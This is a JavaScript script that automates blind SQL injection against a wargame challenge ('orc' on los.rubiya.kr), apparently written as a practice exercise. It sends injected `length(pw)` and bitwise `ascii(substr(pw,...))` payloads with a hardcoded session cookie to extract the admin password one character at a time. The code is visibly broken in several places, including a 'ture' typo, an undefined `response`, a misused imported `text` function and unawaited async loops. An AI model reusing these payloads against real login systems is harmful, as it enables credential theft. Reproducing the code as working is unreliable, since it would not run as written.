import { text } from "express";
import fetch from "node-fetch";

let pw_length = 0,
  value = 0;
let pw_string = "";

let length_array = new Array(10);
length_array.fill(0);
let bit_count = new Array("6", "5", "4", "3", "2", "1", "0");

const url =
  "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw='";

async function length_search() {
  length_array.forEach((item, index) => {
    let find_length_payload = encodeURIComponent(
      `or id='admin' and length(pw)=${index}#`
    );

    fetch(url + find_length_payload, {
      headers: { cookie: "PHPSESSID=a724bmq816dttfsr3038ri4jut" },
    })
      .then((response) => response.text())
      .then((text) => {
        if (text.includes("Hello admin")) {
          pw_length = index;
          ascii_search();
        }
      });
  });
}

async function ascii_search() {
  console.log(`admin의 pw length => ${pw_length}`);
  const length_count = fill_array_value();
  length_count.forEach(async (item) => {
    bit_count.forEach(async (bit_item) => {
      try {
        return_value = await bit_request(item, bit_item);
        value = bit_counting(response.text().includes("Hello admin"));
      } catch (error) {
        console.log(error);
      }
    });
    console.log(`pw[${item}] ascii code = ${value}`);
    pw_string += String.fromCharCode(value);
    value = 0;
  });
  console.log(`admin pw = [${pw_string}]`);
}

function bit_request(item, bit_item) {
  let find_bit_payload = encodeURIComponent(
    `or id='admin' and (ascii(substr(pw,${item},1)) >> ${bit_item}) = ${value}#`
  );
  fetch(url + find_bit_payload, {
    headers: { cookie: "PHPSESSID=a724bmq816dttfsr3038ri4jut" },
  }).then((response) => response.text());
  return text.includes("Hello admin");
}

function fill_array_value() {
  const length_count = new Array(pw_length);
  for (var i = 0; i < pw_length; i++) {
    length_count[i] = i + 1;
  }
  return length_count;
}

function bit_counting(value, bit_item) {
  if (value === ture) {
    if (bit_item != 0) {
      value *= 2;
    }
  } else {
    if (bit_item != 0) {
      value = (value + 1) * 2;
    } else {
      value += 1;
    }
    return value;
  }
  console.log(`${item}의 value ${bit_item} = ${value}`);
}

length_search();
// fetch(bit_encode_uri, {headers : { 'cookie': 'PHPSESSID=a724bmq816dttfsr3038ri4jut'}})
//   .then(response => response.text())
//   .then(json => console.log(json.includes("Hello admin")))
